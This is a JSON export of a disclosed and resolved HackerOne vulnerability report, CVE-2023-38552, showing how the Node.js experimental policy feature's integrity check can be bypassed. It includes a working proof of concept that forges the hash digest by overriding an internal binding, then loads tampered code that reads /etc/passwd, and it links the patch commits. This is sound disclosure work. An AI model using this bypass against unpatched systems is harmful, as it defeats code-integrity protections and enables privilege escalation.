{
  "id": 2208860,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjA4ODYw",
  "url": "https://hackerone.com/reports/2208860",
  "title": "Integrity checks according to policies can be circumvented in Node.js 20 and Node.js 18",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-10-14T00:08:47.937Z",
  "submitted_at": "2023-10-14T00:08:48.104Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tniessen",
    "url": "/tniessen",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4PQXJMPW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICrJNZtAQyR4yHxSQ0EIGny4fkeHckX0t3yoG9wD5uQNAiAuD4L%2FOIA2BztnLAmlWThGnLw8A%2Bag%2BA3VOZdivE%2FStyqxBQh3EAMaDDAxMzYxOTI3NDg0OSIMSo4Dr9SHrVHPRL2HKo4FxYNKUruPSePgCd1l6bgp5eqBSMMY1e5L6fn8kkGlKYLOhzuezRFkxDDPQvUiIUEEOfFC0RTdzZzteczeHg77xpiEw9At3uzKd1yJTMvShQo8bf%2BHj%2F0m0%2Bh8FQr0WBXWG13xK2%2F38d%2Fa2D9UUg7OZjVOgHlRa76Z3e5MnhWTjSXKM%2BWnjnCvmbgZPjs9I1HxXUgckBQrRCYOgjPkah9B3l2tedY4LLtkMqZIsU3gIN8Jgo8p1N%2BaH2Bn9hxvioG0EWwxMrZ7oPYXgLTAl1bY4trBOyQLGfWIAhhuvCvKu6DTZUxgCDyiDk%2B0x8mAj175TtmmbBoOfkHlsnLxR9fkOLxBjp%2FddrpIFtGYKB%2FK0O1ECilZrCH3rZNknhbQDA%2F2vtYZ%2FDnsZIsXO3xV1dViOHKJ6PBdGBBAw4EAT6%2B34vQofS498Volt4Fsm2fA8YMUFdl6kYPt8OlTJT9Gm5OWvtXssQPFX6w3hRxWmRfUEwpbELfYppgVDsjQy08Z9f5cOYMf2k4arKIm5%2BSUZal9qLfwY81Ym9g5YlYf7dBkke4egepnldwARszt0UPpoEoQh%2BafKUN4zG%2BOOyZphjwBeBj1cLmnJAU%2B4N6MQpMMmJ%2Fpcak9ISCGlXe7xoPiESxkL%2F8B32PartiEL9C0CSGg65XMGQMMP2O2SlVpDNLUtaPcGciXDIeFFLeHR8qciEHUYwAZnZkIsGKtgBfFxl8Nm2Mmeu40c%2FBA70kG4l7N1GihJMYYr8o0NLyRsIXWqK%2F264sGVbxVSpZUkqnadxyikf1YTXWfxhHlW4swsDGKto9SYGDgy8br6bls9zXo1ZvNZ5oPhzUGLsnLh73vBIslvajzCTvhd4z59xXG15F3MJrsra4GOrIB082nmQplUsJvmu61HuuuadZBpsN9IzXY1oyixQGALd2auP1Cjfnaj%2FyF0ZWJzTXnS3zVygjxj1kUeSIcFeD91C%2BTIngNtW8UKah5xB%2Br1vNUZCkKzATUuZyVkcee7RBkKaD1%2BA%2FSNDyKlCCo3y5YIk3x2MDV9yKnLBFlASZRWaOfcYYME9oGrA34Iiwlr52ufMgoAYMDGOq0tDEEqsKzTMVl%2FGXNPgTeSBPOMKtaXW%2BEDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=99b260a204a1537e8e656dfc3f59b0087f6d4ab09e688fa44fda65133fc916ae",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4PQXJMPW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICrJNZtAQyR4yHxSQ0EIGny4fkeHckX0t3yoG9wD5uQNAiAuD4L%2FOIA2BztnLAmlWThGnLw8A%2Bag%2BA3VOZdivE%2FStyqxBQh3EAMaDDAxMzYxOTI3NDg0OSIMSo4Dr9SHrVHPRL2HKo4FxYNKUruPSePgCd1l6bgp5eqBSMMY1e5L6fn8kkGlKYLOhzuezRFkxDDPQvUiIUEEOfFC0RTdzZzteczeHg77xpiEw9At3uzKd1yJTMvShQo8bf%2BHj%2F0m0%2Bh8FQr0WBXWG13xK2%2F38d%2Fa2D9UUg7OZjVOgHlRa76Z3e5MnhWTjSXKM%2BWnjnCvmbgZPjs9I1HxXUgckBQrRCYOgjPkah9B3l2tedY4LLtkMqZIsU3gIN8Jgo8p1N%2BaH2Bn9hxvioG0EWwxMrZ7oPYXgLTAl1bY4trBOyQLGfWIAhhuvCvKu6DTZUxgCDyiDk%2B0x8mAj175TtmmbBoOfkHlsnLxR9fkOLxBjp%2FddrpIFtGYKB%2FK0O1ECilZrCH3rZNknhbQDA%2F2vtYZ%2FDnsZIsXO3xV1dViOHKJ6PBdGBBAw4EAT6%2B34vQofS498Volt4Fsm2fA8YMUFdl6kYPt8OlTJT9Gm5OWvtXssQPFX6w3hRxWmRfUEwpbELfYppgVDsjQy08Z9f5cOYMf2k4arKIm5%2BSUZal9qLfwY81Ym9g5YlYf7dBkke4egepnldwARszt0UPpoEoQh%2BafKUN4zG%2BOOyZphjwBeBj1cLmnJAU%2B4N6MQpMMmJ%2Fpcak9ISCGlXe7xoPiESxkL%2F8B32PartiEL9C0CSGg65XMGQMMP2O2SlVpDNLUtaPcGciXDIeFFLeHR8qciEHUYwAZnZkIsGKtgBfFxl8Nm2Mmeu40c%2FBA70kG4l7N1GihJMYYr8o0NLyRsIXWqK%2F264sGVbxVSpZUkqnadxyikf1YTXWfxhHlW4swsDGKto9SYGDgy8br6bls9zXo1ZvNZ5oPhzUGLsnLh73vBIslvajzCTvhd4z59xXG15F3MJrsra4GOrIB082nmQplUsJvmu61HuuuadZBpsN9IzXY1oyixQGALd2auP1Cjfnaj%2FyF0ZWJzTXnS3zVygjxj1kUeSIcFeD91C%2BTIngNtW8UKah5xB%2Br1vNUZCkKzATUuZyVkcee7RBkKaD1%2BA%2FSNDyKlCCo3y5YIk3x2MDV9yKnLBFlASZRWaOfcYYME9oGrA34Iiwlr52ufMgoAYMDGOq0tDEEqsKzTMVl%2FGXNPgTeSBPOMKtaXW%2BEDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10decc64a4229250c0646b78a3f008f96eef1a1c1487b430524c0f3b3f5953a8"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-38552"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-11-30T15:52:02.663Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2023-10-31T15:52:02.163Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** When Node.js is checking the integrity of a resource against a trusted manifest, the application can intercept the operation and return a forged checksum to node's policy implementation, thus effectively disabling the integrity check.\n\n**Description:** Node.js uses the `Hash` class of the built-in `crypto` module to compute a cryptographic hash of each resource. The implementation protects itself against modifications of the `Hash` class prototype by the application, however, the `Hash` class internally relies on several C++ bindings that the application can replace at runtime.\n\nConsider the following `policy.json` file:\n\n```json\n{\n  \"resources\": {\n    \"./main.js\": {\n      \"integrity\": true,\n      \"dependencies\": {\n        \"./protected.js\": true,\n        \"crypto\": true\n      }\n    },\n    \"./protected.js\": {\n      \"integrity\": \"sha384-OLBgp1GsljhM2TJ+sbHjaiH9txEUvgdDTAzHv2P24donTt6/529l+9Ua0vFImLlb\",\n      \"dependencies\": true\n    }\n  }\n}\n```\n\nThe file `main.js` may contain arbitrary code, but it cannot access, for example, the built-in `fs` module. The file `protected.js`, on the other hand, has a strict integrity requirement but can access arbitrary modules. The `main.js` file may require `protected.js`, provided that the integrity of `protected.js` is verified by Node.js.\n\nThe file `main.js` can thus contain arbitrary code. Let the contents be:\n\n```js\nconst h = require('crypto').createHash('sha384');\nconst fakeDigest = h.digest();\n\nconst kHandle = Object.getOwnPropertySymbols(h)\n                      .find((s) => s.description === 'kHandle');\nh[kHandle].constructor.prototype.digest = () => fakeDigest;\n\nrequire('./protected.js');\n```\n\nThe file `protected.js` does _not_ match the integrity value specified in `policy.json`:\n\n```js\nconsole.log(require('fs').readFileSync('/etc/passwd').length);\n```\n\nRunning `main.js` with the policy enabled succeeds despite  the integrity mismatch, and the application reads `/etc/passwd`:\n\n```js\n$ node --experimental-policy=policy.json main.js \n3224\n```\n\n---\n\nThis vulnerability is exploitable in the default build configuration of Node.js, and only requires the user to enable the policy feature when starting Node.js.\n\nI provided a patch, which has been merged into the main branch as [commit e673c0362979f9cb2c74fc6876c45ae9be1fe853](https://github.com/nodejs/node/commit/e673c0362979f9cb2c74fc6876c45ae9be1fe853), into the v20.x release line as [commit a4cb7fc7c04869f051e270ed192a679d2d108328](https://github.com/nodejs/node/commit/a4cb7fc7c04869f051e270ed192a679d2d108328), and into the v18.x release line as [commit 1c538938ccadfd35fbc699d8e85102736cd5945c](https://github.com/nodejs/node/commit/1c538938ccadfd35fbc699d8e85102736cd5945c), all of which have been released on October 13th, 2023.\n\n## Impact\n\nAs per the Node.js documentation at the time the issue was reported, \"Policies are a security feature intended to allow guarantees about what code Node.js is able to load\" and \"The policy manifest will be used to enforce constraints on code loaded by Node.js.\" The current revision of the documentation adds that \"policies guarantee the file integrity when a module is loaded using `require()`, `import()` or `new Module()`.\"\n\nThe presented vulnerability invalidates these statements. Code may be executed through `require()` even if the code has been modified. The modified code inherits all permissions of the supposedly trusted code, which potentially allows the attacker to escalate their permissions as demonstrated above.",
  "bounty_amount": "1270.0",
  "formatted_bounty": "$1,270",
  "weakness": {
    "id": 157,
    "name": "Insufficient Verification of Data Authenticity"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-11-30T15:52:02.276Z",
  "allow_singular_disclosure_after": -6475667.061647369,
  "singular_disclosure_allowed": true,
  "vote_count": 79,
  "voters": [
    "tniessen",
    "zy9ard3",
    "rynexx",
    "kartikg4rg",
    "official_blackhat13",
    "0xrohadi",
    "m4sterpl4gue",
    "trinityisdead",
    "sajid626",
    "zdemirgm",
    "and 69 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 83651,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 367865,
      "category": "team",
      "content": "Integrity checks according to policies can be circumvented (Medium) - (CVE-2023-38552)\nWhen the Node.js policy feature checks the integrity of a resource against a trusted manifest, the application can intercept the operation and return a forged checksum to node's policy implementation, thus effectively disabling the integrity check.\n\nImpacts:\nThis vulnerability affects all users using the experimental policy mechanism in all active release lines: 18.x and, 20.x.\nPlease note that at the time this CVE is issued, the policy mechanism is an experimental feature of Node.js.\n\nThanks to Tobias Nießen who reported and created the security patch.\n\nFull Security Advisory: https://nodejs.org/en/blog/vulnerability/october-2023-security-releases\n\n",
      "user": {
        "id": 904892,
        "username": "kunderkoffler",
        "name": "Kayla Underkoffler",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2020-01-13T19:26:22.339Z",
        "url": "https://hackerone.com/kunderkoffler",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
